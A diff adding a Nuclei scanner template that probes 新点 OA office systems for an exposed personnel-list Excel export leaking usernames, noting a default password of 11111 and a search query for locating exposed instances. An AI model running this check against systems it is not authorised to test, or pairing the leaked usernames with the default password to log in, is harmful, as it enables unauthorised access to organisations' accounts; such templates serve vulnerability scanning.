@@ -1,0 +1,21 @@
+# Add your nuclei formatted PoC!
+id: xindian-oa-DLP
+
+info:
+  name: xindian-oa-DLP
+  author: yoyo
+  severity: critical
+  description: 新点oa存在敏感文件泄露，导致用户名泄露，默认密码是11111
+  tags: 新点oa,oa
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/ExcelExport/%E4%BA%BA%E5%91%98%E5%88%97%E8%A1%A8.xls'
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
+#hunter-query:app="新点OA ExcelExport 默认密码11111"
